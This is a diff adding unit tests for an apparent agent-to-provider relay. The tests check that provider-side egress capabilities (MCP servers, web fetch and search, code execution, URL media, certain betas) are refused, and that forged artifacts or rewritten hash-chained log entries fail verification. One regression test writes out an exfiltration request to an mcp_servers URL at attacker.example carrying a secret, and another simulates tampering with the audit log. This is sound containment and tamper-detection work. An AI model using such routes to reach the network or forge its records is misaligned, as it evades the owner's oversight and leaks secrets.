@@ -93,6 +93,16 @@ class ConfigTests(unittest.TestCase):
         with self.assertRaisesRegex(config.ConfigError, "unknown keys"):
             config.parse(raw_config(self.tmp, runtime={**bad_rt, "image": "ok", "privileged": True}), self.tmp)
 
+    def test_extra_request_fields_cannot_enable_egress_or_pricing(self):
+        model = {"upstream": "https://a.test", "api_key_env": "K", "cost_unit": "tokens"}
+        cfg = config.parse(raw_config(self.tmp, model={**model, "extra_request_fields": ["future_option"]}), self.tmp)
+        self.assertEqual(("future_option",), cfg.model.extra_request_fields)
+        for field in ("mcp_servers", "container", "service_tier", "speed", "inference_geo"):
+            with self.subTest(field=field), self.assertRaisesRegex(config.ConfigError, "cannot be enabled"):
+                config.parse(raw_config(self.tmp, model={**model, "extra_request_fields": [field]}), self.tmp)
+        with self.assertRaisesRegex(config.ConfigError, "field names"):
+            config.parse(raw_config(self.tmp, model={**model, "extra_request_fields": ["Bad-Name"]}), self.tmp)
+
     def test_usd_requires_prices_and_https_upstream(self):
         with self.assertRaisesRegex(config.ConfigError, "prices"):
             config.parse(raw_config(self.tmp, model={"upstream": "https://a.test", "api_key_env": "K", "cost_unit": "usd"}), self.tmp)
@@ -505,6 +515,115 @@ class ProxyTests(unittest.TestCase):
             self.assertEqual(400, unix_post(self.sock, "/v1/messages", bad, TOKEN)[0])
         self.assertEqual([], up.requests)
 
+    # provider-side egress (policy.py)
+    CLAUDE_CODE_BETAS = ("claude-code-20250219,interleaved-thinking-2025-05-14,thinking-token-count-2026-05-13,"
+                         "context-management-2025-06-27,prompt-caching-scope-2026-01-05")
+
+    def test_provider_side_egress_poc_is_refused(self):
+        """Regression for the review finding: the agent asks the provider to reach the network."""
+        up = FakeUpstream(usage={"input_tokens": 1, "output_tokens": 1})
+        self.make(up)
+        body = msg(50, messages=[{"role": "user", "content": "x"}],
+                   mcp_servers=[{"type": "url", "url": "https://attacker.example/mcp?d=SECRET", "name": "x"}],
+                   tools=[{"type": "web_fetch_20250910", "name": "web_fetch"},
+                          {"type": "web_search_20250305", "name": "web_search"}],
+                   container="any")
+        status, reply = unix_post(self.sock, "/v1/messages", body, TOKEN)
+        self.assertEqual(403, status)
+        self.assertIn(b"relay policy", reply)
+        self.assertEqual([], up.requests)
+
+    def test_each_provider_side_capability_is_refused(self):
+        up = FakeUpstream(usage={"input_tokens": 1, "output_tokens": 1})
+        self.make(up)
+        url_image = {"type": "image", "source": {"type": "url", "url": "https://attacker.example/i.png"}}
+        cases = {
+            "mcp_servers": msg(mcp_servers=[{"type": "url", "url": "https://x.example/mcp", "name": "x"}]),
+            "container": msg(container="cntr_1"),
+            "service_tier": msg(service_tier="priority"),
+            "speed": msg(speed="fast"),
+            "inference_geo": msg(inference_geo="us"),
+            "unknown field": msg(some_future_capability={"url": "https://x.example"}),
+            "web_search tool": msg(tools=[{"type": "web_search_20260209", "name": "web_search"}]),
+            "web_fetch tool": msg(tools=[{"type": "web_fetch_20260209", "name": "web_fetch"}]),
+            "code_execution tool": msg(tools=[{"type": "code_execution_20250825", "name": "code_execution"}]),
+            "mcp toolset": msg(tools=[{"type": "mcp_toolset", "mcp_server_name": "x"}]),
+            "tool not an object": msg(tools=["web_search"]),
+            "url image": msg(messages=[{"role": "user", "content": [url_image]}]),
+            "file document": msg(messages=[{"role": "user", "content": [
+                {"type": "document", "source": {"type": "file", "file_id": "file_123"}}]}]),
+            "url document in system": msg(system=[{"type": "document", "source": {"type": "url", "url": "https://x.example/d.pdf"}}]),
+            "url image in tool_result": msg(messages=[{"role": "user", "content": [
+                {"type": "tool_result", "tool_use_id": "t", "content": [url_image]}]}]),
+            "url image in content source": msg(messages=[{"role": "user", "content": [
+                {"type": "document", "source": {"type": "content", "content": [url_image]}}]}]),
+            "container_upload block": msg(messages=[{"role": "user", "content": [
+                {"type": "container_upload", "file_id": "file_123"}]}]),
+            "server tool result replayed": msg(messages=[{"role": "assistant", "content": [
+                {"type": "server_tool_use", "id": "s", "name": "web_fetch", "input": {"url": "https://x.example"}}]}]),
+            "messages not a list": msg(messages={"role": "user"}),
+        }
+        for name, body in cases.items():
+            with self.subTest(name):
+                self.assertEqual(403, unix_post(self.sock, "/v1/messages", body, TOKEN)[0])
+        deep = "x"
+        for _ in range(40):
+            deep = [{"type": "tool_result", "tool_use_id": "t", "content": deep}]
+        self.assertEqual(403, unix_post(self.sock, "/v1/messages", msg(messages=[{"role": "user", "content": deep}]), TOKEN)[0])
+        self.assertEqual([], up.requests)
+
+    def test_denied_betas_are_refused(self):
+        up = FakeUpstream(usage={"input_tokens": 1, "output_tokens": 1})
+        self.make(up)
+        for beta in ("mcp-client-2025-11-20", "files-api-2025-04-14", "code-execution-2025-08-25",
+                     "web-fetch-2025-09-10", "skills-2025-10-02", "fast-mode-2026-02-01",
+                     "context-management-2025-06-27, MCP-Client-2025-04-04"):
+            with self.subTest(beta=beta):
+                status, _ = unix_post(self.sock, "/v1/messages", msg(), {**TOKEN, "anthropic-beta": beta})
+                self.assertEqual(403, status)
+        self.assertEqual([], up.requests)
+
+    def test_claude_code_shaped_requests_are_forwarded_unchanged(self):
+        """The default agent must keep working: shape captured from Claude Code 2.1.295 --bare."""
+        up = FakeUpstream(usage={"input_tokens": 1, "output_tokens": 1})
+        self.make(up)
+        image = {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "iVBORw0KGgo="}}
+        body = msg(1000, stream=False, metadata={"user_id": "u"}, thinking={"type": "enabled", "budget_tokens": 500},
+                   context_management={"edits": [{"type": "clear_thinking_20251015", "keep": "all"}]},
+                   output_config={"effort": "high"},
+                   system=[{"type": "text", "text": "profile", "cache_control": {"type": "ephemeral"}}],
+                   tools=[{"name": "Read", "description": "read", "input_schema": {"type": "object"}},
+                          {"type": "custom", "name": "Edit", "input_schema": {"type": "object"}},
+                          {"type": "bash_20250124", "name": "bash"},
+                          {"type": "text_editor_20250728", "name": "str_replace_based_edit_tool"}],
+                   messages=[
+                       {"role": "user", "content": [{"type": "text", "text": "go"}, image,
+                                                    {"type": "document", "source": {"type": "text", "media_type": "text/plain", "data": "d"}}]},
+                       {"role": "assistant", "content": [{"type": "thinking", "thinking": "t", "signature": "s"},
+                                                         {"type": "tool_use", "id": "t1", "name": "Read", "input": {"url": "anything"}}]},
+                       {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1", "content": [{"type": "text", "text": "ok"}, image]}]},
+                   ])
+        status, _ = unix_post(self.sock, "/v1/messages?beta=true", body, {**TOKEN, "anthropic-beta": self.CLAUDE_CODE_BETAS})
+        self.assertEqual(200, status)
+        self.assertEqual(body, up.forwarded(0))
+        self.assertEqual(self.CLAUDE_CODE_BETAS, up.requests[0][3].get("anthropic-beta"))
+
+    def test_count_tokens_has_its_own_field_set(self):
+        up = FakeUpstream(body=b'{"input_tokens": 3}')
+        self.make(up)
+        ok = {"model": "m", "messages": [{"role": "user", "content": "x"}], "tools": [{"name": "t", "input_schema": {}}]}
+        self.assertEqual(200, unix_post(self.sock, "/v1/messages/count_tokens", ok, TOKEN)[0])
+        for extra in ({"mcp_servers": []}, {"max_tokens": 5}, {"stream": True}):
+            with self.subTest(extra=extra):
+                self.assertEqual(403, unix_post(self.sock, "/v1/messages/count_tokens", {**ok, **extra}, TOKEN)[0])
+        self.assertEqual(1, len(up.requests))
+
+    def test_owner_can_allow_a_named_extra_field(self):
+        up = FakeUpstream(usage={"input_tokens": 1, "output_tokens": 1})
+        self.make(up, extra_request_fields=("future_option",))
+        self.assertEqual(200, unix_post(self.sock, "/v1/messages", msg(future_option=True), TOKEN)[0])
+        self.assertTrue(up.forwarded(0)["future_option"])
+
     # metering
     def test_meters_streaming_usage(self):
         sse = (b'event: message_start\ndata: {"type":"message_start","message":{"model":"m","usage":{"input_tokens":20,"output_tokens":1}}}\n\n'
@@ -660,7 +779,7 @@ class FakeRun:
 
 
 class FakeProxy:
-    def __init__(self, socket_path, token, key, upstream, paths, meter):
+    def __init__(self, socket_path, token, key, upstream, paths, meter, **kw):
         self.meter = meter
         self.on_exhausted = None
 
@@ -911,6 +1030,83 @@ class ServiceTests(Env):
         # Simulate a crash after durable NEXUS finish and before the SQLite update.
         self.contract.finish(run_id, "A", OWNER, 150, False, [], [])
         self.assertTrue(verify(self.cfg))
+
+
+    # chained completion entry is the source of truth (review finding 2)
+    def _complete(self):
+        run_id = self.relay.request_run(self.op, "A", "x")
+        self.relay.approve(self.owner, run_id)
+        self.wait_state(run_id, "completed")
+        return run_id
+
+    def _edit_row(self, run_id, **cols):
+        raw = sqlite3.connect(self.cfg.db_path)
+        raw.execute(f"UPDATE runs SET {', '.join(f'{k} = ?' for k in cols)} WHERE id = ?", (*cols.values(), run_id))
+        raw.commit()
+        raw.close()
+
+    def test_consistent_edit_of_artifact_and_row_is_refused(self):
+        run_id = self._complete()
+        forged = b"forged result"
+        (self.cfg.runs_dir / run_id / "output.txt").write_bytes(forged)
+        self._edit_row(run_id, artifact_digest=hashlib.sha256(forged).hexdigest())
+        self.assertTrue(any("artifact_digest does not match" in p for p in verify(self.cfg)))
+        self.assertTrue(any("output.txt digest mismatch" in p for p in verify(self.cfg)))
+        with self.assertRaisesRegex(service.Conflict, "record failed verification"):
+            self.relay.review(self.owner, run_id, True, ["contract_met"], "looks fine")
+        self.assertEqual([], [e for e in self.contract.events() if e["type"] == "finish"])
+
+    def test_edited_cost_never_reaches_nexus(self):
+        run_id = self._complete()
+        self._edit_row(run_id, actual_cost=1)
+        with self.assertRaisesRegex(service.Conflict, "actual_cost"):
+            self.relay.review(self.owner, run_id, True, ["contract_met"], "ok")
+        self.relay.review(self.owner, run_id, False, [], "record was edited")
+        finish = [e for e in self.contract.events() if e["type"] == "finish"][0]
+        self.assertEqual(150, finish["actual_cost"])
+        self.assertEqual(150, self.store.run(run_id)["actual_cost"])  # restored from the log
+        rejected = [e for e in self.store.entries_after(0) if e["kind"] == "run.rejected"][0]
+        self.assertTrue(rejected["payload"]["record_mismatches"])
+        self.assertEqual([], verify(self.cfg))
+
+    def test_verify_flags_finish_citing_other_digests(self):
+        run_id = self._complete()
+        self.relay.review(self.owner, run_id, True, ["contract_met"], "ok")
+        lines = self.cfg.events_path.read_text().splitlines()
+        events = [json.loads(line) for line in lines]
+        for e in events:
+            if e["type"] == "finish":
+                e["evidence_refs"] = ["relay-output:sha256:" + "0" * 64 if r.startswith("relay-output:") else r
+                                      for r in e["evidence_refs"]]
+        self.cfg.events_path.write_text("".join(json.dumps(e) + "\n" for e in events))
+        self.assertTrue(any("relay-output digest" in p for p in verify(self.cfg)))
+
+    def test_forged_completion_entry_is_refused_with_a_keyed_chain(self):
+        self.store.close()
+        self.store = store.Store(self.cfg.db_path, chain_key=KEY)
+        self.relay = service.Relay(self.cfg, self.store, self.contract, runner_factory=FakeRun,
+                                   proxy_factory=FakeProxy, api_key="sk-test")
+        run_id = self._complete()
+        forged = b"forged result"
+        digest = hashlib.sha256(forged).hexdigest()
+        (self.cfg.runs_dir / run_id / "output.txt").write_bytes(forged)
+        self._edit_row(run_id, artifact_digest=digest)
+        # Without the key, the attacker can only rewrite the entry with a plain hash.
+        raw = sqlite3.connect(self.cfg.db_path)
+        raw.execute("DROP TRIGGER IF EXISTS log_no_update")
+        seq, at, kind, actor, payload, prev = raw.execute(
+            "SELECT seq, at, kind, actor, payload, prev_hash FROM log WHERE kind = 'run.completed'").fetchone()
+        payload = store.canonical({**json.loads(payload), "artifact_digest": digest})
+        for alg, h in (("sha256", store.entry_hash(prev, seq, at, kind, actor, payload)),
+                       ("hmac-sha256", store.entry_hash(prev, seq, at, kind, actor, payload, b"x" * 32))):
+            raw.execute("UPDATE log SET payload = ?, hash = ?, alg = ? WHERE seq = ?", (payload, h, alg, seq))
+            raw.commit()
+            with self.subTest(alg=alg):
+                for accepted in (True, False):
+                    with self.assertRaisesRegex(service.Conflict, "record failed verification"):
+                        self.relay.review(self.owner, run_id, accepted, ["contract_met"] if accepted else [], "x")
+        raw.close()
+        self.assertEqual([], [e for e in self.contract.events() if e["type"] == "finish"])
 
 
 class EvidenceTests(unittest.TestCase):
